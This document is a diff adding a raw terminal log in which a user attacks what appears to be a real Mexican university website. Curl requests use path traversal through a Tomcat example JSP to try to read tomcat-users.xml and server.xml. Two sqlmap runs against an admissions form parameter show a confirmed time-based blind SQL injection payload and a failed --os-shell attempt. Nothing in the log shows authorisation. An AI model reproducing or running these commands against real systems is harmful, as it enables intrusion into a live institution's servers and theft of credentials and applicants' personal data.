@@ -1,0 +1,380 @@
+┌──(marco-os㉿Marco-Antonio)-[~]
+└─$ curl -k "https://sito.utslp.edu.mx/examples/jsp/include/include.jsp?page=../../../../../../../../../../../../Program%20Files/Apache%20Software%20Foundation/Tomcat%206.0/conf/tomcat-users.xml"
+<html>
+<!--
+ Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+-->
+
+<body bgcolor="white">
+
+<font color="red">
+
+
+
+<p>In place evaluation of another JSP which gives you the current time:
+
+<!--
+ Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+-->
+
+<body bgcolor="white">
+<font color="red">
+
+1760196366578
+
+
+<p> <!--
+ Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+-->
+To get the current time in ms
+ by including the output of another JSP:
+
+<!--
+ Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+-->
+
+<body bgcolor="white">
+<font color="red">
+
+1760196366594
+
+
+:-) 
+
+</html>
+
+┌──(marco-os㉿Marco-Antonio)-[~]
+└─$ sqlmap -u "https://sito.utslp.edu.mx/jsp/escolar/proceso_admision/proceso_interesado_entrevistas.jsp?xModalidadP=N" \
+    --method POST --data="xCurp=AAAAAAAAAAAAAAAAAA&yAccion=VCURP" -p xCurp \
+    --dbms="microsoft sql server" --technique=T \
+    --tamper=space2comment,space2mssqlblank \
+    --random-agent --ignore-redirects \
+    --os-shell
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.9.9#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 09:27:13 /2025-10-11/
+
+[09:27:13] [INFO] loading tamper module 'space2comment'
+[09:27:13] [INFO] loading tamper module 'space2mssqlblank'
+[09:27:13] [WARNING] tamper script 'space2mssqlblank' is only meant to be run against Microsoft SQL Server
+[09:27:13] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)' from file '/usr/share/sqlmap/data/txt/user-agents.txt'            
+[09:27:13] [INFO] testing connection to the target URL
+you have not declared cookie(s), while server wants to set its own ('JSESSIONID=FE1D30A8596...F3B1BCCE49'). Do you want to use those [Y/n] y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: xCurp (POST)
+    Type: time-based blind
+    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)
+    Payload: xCurp=AAAAAAAAAAAAAAAAAA') AND 1679=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND ('vIZS'='vIZS&yAccion=VCURP
+---
+[09:27:28] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
+[09:27:28] [INFO] testing Microsoft SQL Server
+[09:27:28] [INFO] confirming Microsoft SQL Server
+[09:27:28] [INFO] the back-end DBMS is Microsoft SQL Server
+web application technology: JSP, Django
+back-end DBMS: Microsoft SQL Server 2022
+[09:27:28] [CRITICAL] unable to prompt for an interactive operating system shell via the back-end DBMS because stacked queries SQL injection is not supported
+
+[*] ending @ 09:27:28 /2025-10-11/
+
+                                                                                
+┌──(marco-os㉿Marco-Antonio)-[~]
+└─$ sqlmap -u "https://sito.utslp.edu.mx/jsp/escolar/proceso_admision/proceso_interesado_entrevistas.jsp?xModalidadP=N" \
+    --method POST --data="xCurp=AAAAAAAAAAAAAAAAAA&yAccion=VCURP" -p xCurp \
+    --dbms="microsoft sql server" --technique=T \
+    --tamper=space2comment,space2mssqlblank \
+    --random-agent --ignore-redirects \
+    --os-shell
+        ___
+       __H__                                                                    
+ ___ ___[(]_____ ___ ___  {1.9.9#stable}                                        
+|_ -| . [(]     | .'| . |                                                       
+|___|_  [.]_|_|_|__,|  _|                                                       
+      |_|V...       |_|   https://sqlmap.org                                    
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 09:27:34 /2025-10-11/
+
+[09:27:34] [INFO] loading tamper module 'space2comment'
+[09:27:34] [INFO] loading tamper module 'space2mssqlblank'
+[09:27:34] [WARNING] tamper script 'space2mssqlblank' is only meant to be run against Microsoft SQL Server
+[09:27:34] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10' from file '/usr/share/sqlmap/data/txt/user-agents.txt'   
+[09:27:34] [INFO] testing connection to the target URL
+you have not declared cookie(s), while server wants to set its own ('JSESSIONID=CABFA396F27...EAED50BF7B'). Do you want to use those [Y/n] n
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: xCurp (POST)
+    Type: time-based blind
+    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)
+    Payload: xCurp=AAAAAAAAAAAAAAAAAA') AND 1679=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND ('vIZS'='vIZS&yAccion=VCURP
+---
+[09:27:36] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
+[09:27:36] [INFO] testing Microsoft SQL Server
+[09:27:36] [INFO] confirming Microsoft SQL Server
+[09:27:36] [INFO] the back-end DBMS is Microsoft SQL Server
+web application technology: Django, JSP
+back-end DBMS: Microsoft SQL Server 2022
+[09:27:36] [CRITICAL] unable to prompt for an interactive operating system shell via the back-end DBMS because stacked queries SQL injection is not supported
+
+[*] ending @ 09:27:36 /2025-10-11/
+
+                                                                                
+┌──(marco-os㉿Marco-Antonio)-[~]
+└─$ 
+
+
+┌──(marco-os㉿Marco-Antonio)-[~]
+└─$ curl -k "https://sito.utslp.edu.mx/examples/jsp/include/include.jsp?page=../../../../../../../../../../../../Program%20Files/Apache%20Software%20Foundation/Tomcat%206.0/conf/tomcat-users.xml"
+<html>
+<!--
+ Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+-->
+
+<body bgcolor="white">
+
+<font color="red">
+
+
+
+<p>In place evaluation of another JSP which gives you the current time:
+
+<!--
+ Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+-->
+
+<body bgcolor="white">
+<font color="red">
+
+1760197358317
+
+
+<p> <!--
+ Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+-->
+To get the current time in ms
+ by including the output of another JSP:
+
+<!--
+ Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+-->
+
+<body bgcolor="white">
+<font color="red">
+
+1760197358317
+
+
+:-) 
+
+</html>
+                                                                                
+┌──(marco-os㉿Marco-Antonio)-[~]
+└─$ curl -k "https://sito.utslp.edu.mx/examples/jsp/include/include.jsp?page=../../../../../../../../../../../../Program%20Files/Apache%20Software%20Foundation/Tomcat%206.0/conf/server.xml"
+<html>
+<!--
+ Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+-->
+
+<body bgcolor="white">
+
+<font color="red">
+
+
+
+<p>In place evaluation of another JSP which gives you the current time:
+
+<!--
+ Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+-->
+
+<body bgcolor="white">
+<font color="red">
+
+1760197403134
+
+
+<p> <!--
+ Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+-->
+To get the current time in ms
+ by including the output of another JSP:
+
+<!--
+ Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+-->
+
+<body bgcolor="white">
+<font color="red">
+
+1760197403149
+
+
+:-) 
+
+</html>
+         
+         
